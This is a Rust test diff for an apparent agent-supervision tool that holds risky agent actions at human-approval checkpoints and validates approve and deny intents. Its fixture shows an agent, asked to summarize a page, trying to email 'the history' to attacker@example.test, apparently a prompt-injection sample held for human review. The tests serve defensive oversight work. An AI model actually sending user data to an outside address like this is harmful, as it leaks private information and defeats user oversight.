@@ -1378,3 +1378,167 @@ mod stop_all_tests {
         }
     }
 }
+
+#[cfg(test)]
+mod checkpoint_tests {
+    use super::*;
+    use corral_core::corral_view::{AgentCard, DropView};
+    use corral_core::domain::{ActionClass, Risk};
+    use corral_core::event::*;
+    use corral_core::ids::{CheckpointId, RunId, SessionId, SpanId, ToolCallId};
+    use corral_core::run_card::RunCards;
+    use corral_policy::{Approval, Scope};
+    use serde_json::Value;
+
+    const ROSTER: &str =
+        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-checkpoint-v1.json");
+    const APPROVE: &str = include_str!(
+        "../../../../native/CorralNative/Fixtures/bridge/intent-approve-checkpoint-v1.json"
+    );
+    const DENY: &str = include_str!(
+        "../../../../native/CorralNative/Fixtures/bridge/intent-deny-checkpoint-v1.json"
+    );
+
+    fn ev(ts: u64, body: EventBody) -> Event {
+        Event {
+            run_id: RunId::from("r1"),
+            seq: 1,
+            ts,
+            span_id: SpanId::from("span"),
+            parent_span_id: None,
+            body,
+        }
+    }
+
+    #[test]
+    fn tp_chk_08_a_waiting_checkpoint_rides_on_the_card_as_the_fixture_shows() {
+        let mut cards = RunCards::default();
+        let events = [
+            ev(
+                0,
+                EventBody::RunQueued(RunQueued {
+                    agent_id: AgentId::from("scout"),
+                    session_id: SessionId::from("s1"),
+                    prompt: "Summarize the attached page.".into(),
+                }),
+            ),
+            ev(
+                1_000,
+                EventBody::RunStarted(RunStarted {
+                    adapter: "fake".into(),
+                }),
+            ),
+            ev(
+                2_000,
+                EventBody::CheckpointOpened(CheckpointOpened {
+                    checkpoint_id: CheckpointId::from("cp-1"),
+                    tool_call_id: ToolCallId::from("call-1"),
+                    action_class: ActionClass::CommsSend,
+                    risk: Risk::High,
+                    title: "Sending a message or email".into(),
+                    detail: "email.send to attacker@example.test\n{\"body\":\"the history\",\"to\":\"attacker@example.test\"}".into(),
+                }),
+            ),
+        ];
+        for e in &events {
+            cards.observe(e).expect("legal");
+        }
+        let view = CorralView {
+            drops: vec![DropView {
+                agent: AgentCard {
+                    id: AgentId::from("scout"),
+                    name: "Scout".into(),
+                    monogram: "Sc".into(),
+                },
+                state: DropState::NeedsYou,
+            }],
+            hidden: 0,
+        };
+        let sent = RosterSnapshot::with_cards(&view, &cards, 5_000)
+            .to_bytes()
+            .expect("encode");
+        let sent: Value = serde_json::from_slice(&sent).expect("json");
+        let want: Value = serde_json::from_str(ROSTER).expect("fixture");
+        assert_eq!(sent, want);
+    }
+
+    #[test]
+    fn tp_chk_08_approve_and_deny_from_a_card_arrive_typed() {
+        assert_eq!(
+            decode_intent(APPROVE.as_bytes()).expect("approve"),
+            Intent::ApproveCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                scope: Scope::Once,
+                how: Approval::Click,
+            }
+        );
+        assert_eq!(
+            decode_intent(DENY.as_bytes()).expect("deny"),
+            Intent::DenyCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                note: Some("Don't email anyone.".into()),
+            }
+        );
+        let for_run = r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"forRun","how":"keyboard"}}"#;
+        assert_eq!(
+            decode_intent(for_run.as_bytes()).expect("for run"),
+            Intent::ApproveCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                scope: Scope::ForRun,
+                how: Approval::Keyboard,
+            }
+        );
+        let no_note =
+            r#"{"v":1,"intent":{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1"}}"#;
+        assert_eq!(
+            decode_intent(no_note.as_bytes()).expect("no note"),
+            Intent::DenyCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                note: None,
+            }
+        );
+    }
+
+    #[test]
+    fn tp_chk_08_touch_id_and_voice_never_come_from_a_card_and_bad_answers_are_refused() {
+        let note = "n".repeat(MAX_NOTE_BYTES + 1);
+        let long_note = format!(
+            r#"{{"v":1,"intent":{{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1","note":"{note}"}}}}"#
+        );
+        let bad = [
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"once","how":"touchId"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"once","how":"voice"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"forever","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"","scope":"once","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp\u0007","scope":"once","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"","checkpoint":"cp-1","scope":"once","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"once","how":"click","args":{}}}"#,
+            r#"{"v":1,"intent":{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1","note":"ok","scope":"once"}}"#,
+            long_note.as_str(),
+        ];
+        for b in bad {
+            assert!(
+                decode_intent(b.as_bytes()).is_err(),
+                "{}",
+                &b[..b.len().min(160)]
+            );
+        }
+        assert!(matches!(
+            decode_intent(long_note.as_bytes()),
+            Err(BridgeError::NoteTooLong(n)) if n == MAX_NOTE_BYTES + 1
+        ));
+        let fits = "n".repeat(MAX_NOTE_BYTES);
+        let at_cap = format!(
+            r#"{{"v":1,"intent":{{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1","note":"{fits}"}}}}"#
+        );
+        assert!(
+            decode_intent(at_cap.as_bytes()).is_ok(),
+            "a note of exactly {MAX_NOTE_BYTES} bytes is fine"
+        );
+    }
+}
